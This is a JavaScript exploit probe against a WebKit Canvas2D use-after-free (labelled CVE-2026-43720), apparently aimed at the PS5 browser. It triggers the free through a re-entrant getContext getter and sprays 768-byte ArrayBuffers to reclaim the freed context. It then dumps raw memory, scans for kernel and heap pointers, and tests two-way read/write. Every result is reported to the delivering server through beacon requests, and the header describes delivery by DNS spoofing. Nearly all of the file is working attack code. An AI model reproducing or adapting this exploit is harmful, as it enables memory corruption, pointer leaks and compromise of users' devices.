// PROBE P568: ArrayBuffer reclaim of freed Canvas2D context (768B)
//
// GOAL: Trigger Canvas UAF (CVE-2026-43720), then spray 768-byte
//       ArrayBuffers to reclaim the freed CanvasRenderingContext2D.
//       Read raw bytes via DataView to extract any surviving pointers
//       (bypasses DAZ since DataView uses integer paths, not FPU).
//
// THEORY: ISO_MALLOC is OFF on PS5 WebKit. bmalloc should serve
//         768B from the same size class for both Canvas2D and ArrayBuffer.
//         If reclaim works, we get bidirectional raw byte R/W over
//         the freed context's memory, including vtable and internal ptrs.
//
// DELIVERY: host.py DNS spoofing + HTTPS (User Guide redirect)

(() => {
  const B = (tag, extra = '') => {
    new Image().src = '/beacon/P568-' + encodeURIComponent(tag) +
      (extra ? '-' + encodeURIComponent(extra) : '') +
      '?t=' + performance.now().toFixed(0);
  };

  B('BOOT');

  // === PHASE A: Trigger Canvas UAF ===
  // Re-entrant getContext frees the first context while inner still refs it
  let inner = null;
  let outer = null;

  const canvas = document.createElement('canvas');
  canvas.width = 300;
  canvas.height = 150;

  const opts = {};
  Object.defineProperty(opts, 'desynchronized', {
    get() {
      // This creates context A and assigns it to the canvas
      inner = canvas.getContext('2d');
      return false;
    }
  });

  try {
    // This starts creating context B; during opts conversion, the getter
    // fires and creates A. When B completes, A is replaced and freed.
    // inner = dangling ref to freed A (768 bytes)
    // outer = valid ref to B
    outer = canvas.getContext('2d', opts);
  } catch (e) {
    B('UAF-ERR', e.name + ':' + e.message.slice(0, 60));
  }

  if (!inner || !outer) {
    B('UAF-FAIL', 'inner=' + !!inner + ',outer=' + !!outer);
    return;
  }

  if (inner === outer) {
    B('UAF-SAME', 'no-split');
    return;
  }

  B('UAF-OK', 'inner!=outer');

  // === PHASE B: Spray 768-byte ArrayBuffers to reclaim freed slot ===
  const SPRAY_COUNT = 512;
  const TARGET_SIZE = 768;
  const spray = [];

  // Fill each buffer with a recognizable pattern so we can detect reclaim
  for (let i = 0; i < SPRAY_COUNT; i++) {
    const ab = new ArrayBuffer(TARGET_SIZE);
    const dv = new DataView(ab);
    // Write tag pattern: each qword = 0xBBBB0000 | index
    for (let off = 0; off < TARGET_SIZE; off += 8) {
      dv.setUint32(off, 0xBBBB0000 | i, true);
      dv.setUint32(off + 4, 0xAAAAAAAA, true);
    }
    spray.push({ ab, dv });
  }

  B('SPRAY-DONE', SPRAY_COUNT + 'x' + TARGET_SIZE);

  // === PHASE C: Probe the dangling inner context ===
  // If an ArrayBuffer reclaimed the freed memory, writing through inner
  // should corrupt the ArrayBuffer's data, and vice versa.

  // First, read canvas properties through inner (the dangling ref)
  // These access the freed memory; if reclaimed by our spray, they
  // will read our tag pattern instead of valid context fields
  let probeResults = {};
  try {
    // fillStyle getter reads from the context object
    probeResults.fillStyle = inner.fillStyle;
    B('INNER-FILL', String(probeResults.fillStyle).slice(0, 40));
  } catch (e) {
    B('INNER-FILL-ERR', e.name);
  }

  try {
    probeResults.globalAlpha = inner.globalAlpha;
    B('INNER-ALPHA', String(probeResults.globalAlpha));
  } catch (e) {
    B('INNER-ALPHA-ERR', e.name);
  }

  try {
    probeResults.lineWidth = inner.lineWidth;
    B('INNER-LINEWIDTH', String(probeResults.lineWidth));
  } catch (e) {
    B('INNER-LINEWIDTH-ERR', e.name);
  }

  // === PHASE D: Write through inner, check spray for corruption ===
  // If inner's memory is now an ArrayBuffer, setting fillStyle should
  // modify bytes in one of our spray buffers
  try {
    inner.fillStyle = '#ff0000';
    B('INNER-WRITE-OK');
  } catch (e) {
    B('INNER-WRITE-ERR', e.name);
  }

  // Check all spray buffers for corruption (any byte not matching our tag)
  let corruptCount = 0;
  let corruptIdx = -1;
  let corruptDetails = '';

  for (let i = 0; i < spray.length; i++) {
    const dv = spray[i].dv;
    let clean = true;
    for (let off = 0; off < TARGET_SIZE; off += 8) {
      const lo = dv.getUint32(off, true);
      const hi = dv.getUint32(off + 4, true);
      if (lo !== (0xBBBB0000 | i) || hi !== 0xAAAAAAAA) {
        clean = false;
        if (corruptCount < 3) {
          corruptDetails += 'i=' + i + ',off=' + off +
            ',lo=' + lo.toString(16) + ',hi=' + hi.toString(16) + ';';
        }
        break;
      }
    }
    if (!clean) {
      corruptCount++;
      if (corruptIdx === -1) corruptIdx = i;
    }
  }

  B('CORRUPT', corruptCount + '/' + spray.length + ',first=' + corruptIdx);
  if (corruptDetails) B('CORRUPT-DETAIL', corruptDetails);

  // === PHASE E: If corruption found, dump the reclaimed buffer ===
  if (corruptIdx >= 0) {
    B('RECLAIM-HIT');
    const dv = spray[corruptIdx].dv;

    // Dump first 128 bytes as hex (potential vtable, pointers)
    for (let off = 0; off < 128 && off < TARGET_SIZE; off += 8) {
      let hex;
      try {
        // Try BigUint64Array path first (bypasses DAZ completely)
        const tmp = new BigUint64Array(spray[corruptIdx].ab, off, 1);
        hex = tmp[0].toString(16).padStart(16, '0');
      } catch (_) {
        // Fallback to DataView getUint32 pairs
        const lo = dv.getUint32(off, true);
        const hi = dv.getUint32(off + 4, true);
        hex = hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
      }
      B('DUMP', '+' + off.toString(16) + ':' + hex);
    }

    // Check for kernel-range pointers (0xFFFF8xxx_xxxxxxxx)
    for (let off = 0; off < TARGET_SIZE; off += 8) {
      const hi = dv.getUint32(off + 4, true);
      if ((hi & 0xFFFF8000) === 0xFFFF8000 && hi !== 0xFFFFFFFF) {
        const lo = dv.getUint32(off, true);
        B('KPTR', '+' + off.toString(16) + ':' +
          hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
      }
    }

    // Check for heap-range pointers (0x000000xx_xxxxxxxx, high byte < 0x80)
    for (let off = 0; off < TARGET_SIZE; off += 8) {
      const hi = dv.getUint32(off + 4, true);
      if (hi > 0 && hi < 0x00008000 && hi !== 0xAAAAAAAA) {
        const lo = dv.getUint32(off, true);
        if (lo !== (0xBBBB0000 | corruptIdx)) {
          B('HPTR', '+' + off.toString(16) + ':' +
            hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
        }
      }
    }

    // === PHASE F: Write a marker through the ArrayBuffer, read via inner ===
    // Write known float64 values at key offsets, then read them via inner
    // to confirm bidirectional access
    try {
      // globalAlpha is stored as a double at some offset in the context
      // Write 0.12345 pattern at offset 0 and every 8B, see what inner reads
      const marker = 0.123456789;
      for (let off = 0; off < TARGET_SIZE; off += 8) {
        const f64 = new Float64Array(spray[corruptIdx].ab, off, 1);
        f64[0] = marker;
      }
      // Now read through inner
      const readAlpha = inner.globalAlpha;
      const readWidth = inner.lineWidth;
      B('BIDI-CHECK', 'alpha=' + readAlpha + ',width=' + readWidth);
    } catch (e) {
      B('BIDI-ERR', e.name);
    }
  } else {
    B('NO-RECLAIM', 'spray-miss');

    // === PHASE G: Try different sizes near 768 ===
    // bmalloc size classes may round 768 differently than we expect
    const altSizes = [752, 760, 768, 776, 784, 800, 832, 896, 1024];
    for (const sz of altSizes) {
      // Trigger a fresh UAF for each size test
      const c2 = document.createElement('canvas');
      c2.width = 100;
      c2.height = 100;
      let in2 = null;
      const o2 = {};
      Object.defineProperty(o2, 'desynchronized', {
        get() { in2 = c2.getContext('2d'); return false; }
      });
      try {
        c2.getContext('2d', o2);
      } catch (_) {}

      if (!in2) continue;

      // Spray at this size
      const alt = [];
      for (let i = 0; i < 256; i++) {
        const ab = new ArrayBuffer(sz);
        const u8 = new Uint8Array(ab);
        u8.fill(0xCC);
        alt.push(ab);
      }

      // Check if inner reads garbage (reclaimed)
      try {
        const a = in2.globalAlpha;
        if (a !== 1.0) {
          B('ALT-HIT', 'sz=' + sz + ',alpha=' + a);
        }
      } catch (e) {
        B('ALT-ERR', 'sz=' + sz + ',' + e.name);
      }
    }
    B('ALT-SCAN-DONE');
  }

  B('DONE');
  setTimeout(() => B('ALIVE-5s'), 5000);
})();
